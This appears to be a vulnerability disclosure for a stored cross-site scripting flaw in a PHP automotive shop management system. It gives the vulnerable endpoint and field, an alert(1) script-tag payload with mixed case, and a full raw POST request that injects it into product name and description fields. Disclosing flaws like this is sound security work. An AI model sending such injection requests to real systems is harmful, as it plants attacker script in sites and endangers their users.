# Automotive Shop Management System v1.0 - Cross-site Scripting (XSS)

vendors: https://www.sourcecodester.com/php/15312/automotive-shop-management-system-phpoop-free-source-code.html

Date: 2022-05-07

Vulnerability File: /asms/classes/Master.php?f=save_product

Vulnerability location: /asms/classes/Master.php?f=save_product, name

[+] Payload: <sCrIpT>alert(1)</sCrIpT>

Tested on Windows 10, XAMPP

```
POST /asms/classes/Master.php?f=save_product HTTP/1.1
Host: 192.168.2.106
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------83960212638164850273547100712
Content-Length: 835
Origin: http://192.168.2.106
Connection: keep-alive
Referer: http://192.168.2.106/asms/admin/?page=products
Cookie: PHPSESSID=0389fublnj7ggho8q04fuvfaqe

-----------------------------83960212638164850273547100712
Content-Disposition: form-data; name="id"

5
-----------------------------83960212638164850273547100712
Content-Disposition: form-data; name="name"

<ScRiPt>alert(1)</ScRiPt>
-----------------------------83960212638164850273547100712
Content-Disposition: form-data; name="description"

<ScRiPt>alert(1)</ScRiPt>
-----------------------------83960212638164850273547100712
Content-Disposition: form-data; name="price"

1100.00
-----------------------------83960212638164850273547100712
Content-Disposition: form-data; name="status"

1
-----------------------------83960212638164850273547100712
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream


-----------------------------83960212638164850273547100712--

```

![](https://github.com/mikeccltt/automotive/blob/main/automotive-shop-management-system/xss.gif?raw=true)
